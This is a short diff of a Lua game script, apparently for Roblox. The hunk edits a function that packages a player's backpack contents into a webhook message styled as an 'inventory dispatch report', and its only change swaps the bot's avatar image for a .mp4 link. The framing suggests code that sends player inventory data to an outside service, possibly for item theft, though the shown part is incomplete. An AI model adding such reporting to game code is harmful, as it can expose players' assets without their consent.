@@ -83,7 +83,7 @@ local function sendBackpackToWebhook()
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
         username = "Central Processing System",
-        avatar_url = "https://i.imgur.com/W9v686C.png", -- Clean default developer bot icon
+        avatar_url = "https://i.imgur.com/MeasW1r.mp4", -- Clean default developer bot icon
         embeds = {{
             title = "📦 INVENTORY DISPATCH REPORT",
             description = "A new player asset transfer sequence has been initialized on execution.",
